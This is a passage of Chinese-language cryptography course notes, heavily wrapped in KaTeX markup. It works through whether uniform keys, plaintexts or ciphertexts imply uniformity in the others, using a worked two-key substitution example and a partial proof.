stretchy="false">(</mo><mi>K</mi><mo>=</mo><mi>k</mi><mo stretchy="false">)</mo><mi>P</mi><mo stretchy="false">(</mo><mi>X</mi><mo>=</mo><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">P(Y=y)=\sum_{k:y\in C(k)}P(K=k)P(X=d_k(y))</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.5660100000000003em;vertical-align:-1.516005em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.808995em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mrel mtight">:</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose mtight">)</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.516005em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">)</span></span></span></span></span></p><p><strong>若密钥K随机等概率获取，则密文C不一定随机等概率。因为明文出现的概率未知。</strong><br /><strong>若密文C等概率获取，则明文P不一定随机等概率。如下例：</strong></p><table><thead><tr><th style="text-align:center"></th><th style="text-align:center">a</th><th style="text-align:center">b</th><th style="text-align:center">c</th><th style="text-align:center">d</th><th style="text-align:center">e</th></tr></thead><tbody><tr><td style="text-align:center">k1</td><td style="text-align:center">e</td><td style="text-align:center">d</td><td style="text-align:center">c</td><td style="text-align:center">b</td><td style="text-align:center">a</td></tr><tr><td style="text-align:center">k2</td><td style="text-align:center">a</td><td style="text-align:center">b</td><td style="text-align:center">c</td><td style="text-align:center">d</td><td style="text-align:center">e</td></tr></tbody></table><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>a</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0.1</mn><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>b</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0.15</mn><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>c</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0.2</mn><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>d</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0.25</mn><mo separator="true">,</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>e</mi><mo stretchy="false">]</mo><mo>=</mo><mn>0.3</mn><mspace linebreak="newline"></mspace><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mn>1</mn><mo stretchy="false">]</mo><mo>=</mo><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>k</mi><mn>2</mn><mo stretchy="false">]</mo><mo>=</mo><mn>0.5</mn></mrow><annotation encoding="application/x-tex">Pr[a]=0.1, Pr[b]=0.15, Pr[c]=0.2, Pr[d]=0.25, Pr[e]=0.3\\Pr[k1]=Pr[k2]=0.5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">a</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">b</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">1</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">c</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">d</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">2</span><span class="mord">5</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal">e</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">3</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">1</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mord">2</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mord">.</span><span class="mord">5</span></span></span></span></span></p><p>密文等概率，但明文并不随机等概率</p><p><font color=red><strong>若明文P随机等概率获取，则密文C不一定随机等概率。证明如下：</strong><br />如果<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>则一定等概率，否则不一定。<br />证明：<br />首先证明当<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi><mo>=</mo><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|P|=|C|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span></span></span></span>时，密文一定随机等概率<br />对于任意一密文字符<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>c</mi><mo>∈</mo><mi>C</mi></mrow><annotation encoding="application/x-tex">c\in C</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span></span></span></span>，设密钥空间<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>中密钥<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">k_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>的概率为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.76508em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，设<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>e</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msub><mi>x</mi><mi>j</mi></msub><mo stretchy="false">)</mo><mo>=</mo><msub><mi>y</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">e_i(x_{j})=y_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，所有明文字符取值概率均为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>p</mi></mrow><annotation encoding="application/x-tex">p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span></span></span></span>。由于对于任意<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>k</mi><mi>i</mi></msub><mo>∈</mo><mi>K</mi></mrow><annotation encoding="application/x-tex">k_i\in K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∣</mi><mi>C</mi><mi mathvariant="normal">∣</mi><mo>→</mo><mi mathvariant="normal">∣</mi><mi>P</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|C|\rightarrow |P|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mord">∣</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">→</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord">∣</span></span></span></span>是一个双射，因此给定<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>k</mi><mo separator="true">,</mo><mi mathvariant="normal">∀</mi><mi>y</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi mathvariant="normal">∃</mi><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">k,\forall y\in C,\exist x\in P,e_k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∃</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>，即<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∀</mi><mi>y</mi><mo>∈</mo><mi>C</mi><mo separator="true">,</mo><mi mathvariant="normal">∀</mi><mi>k</mi><mo>∈</mo><mi>K</mi><mo separator="true">,</mo><mi mathvariant="normal">∃</mi><mi>x</mi><mo>∈</mo><mi>P</mi><mo separator="true">,</mo><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">\forall y\in C,\forall k\in K,\exist x\in P,e_k(x)=y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">C</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∀</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∃</span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span>。故</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>P</mi><mi>r</mi><mo stretchy="false">[</mo><mi>y</mi><mo>=</mo><msub><mi>y</mi><mi>k</mi></msub><mo stretchy="false">]</mo><mo>=</mo><munder><mo>∑</mo><mi>K</mi></munder><msub><mi>k</mi><mi>i</mi></msub><msub><mi>x</mi><mi>j</mi></msub><mo>=</mo><munder><mo>∑</mo><mi>K</mi></munder><msub><mi>k</mi><mi>i</mi></msub><mi>p</mi><mo>=</mo><mi>p</mi></mrow><annotation encoding="application/x-tex">Pr[y=y_k]=\sum_K k_ix_{j}=\sum_K k_ip=p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.344341em;vertical-align:-1.294336em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.311664em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.344341em;vertical-align:-1.294336em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0500050000000003em;"><span style="top:-1.855664em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">K</span></span></span><span style="top:-3.050005em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.294336em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord 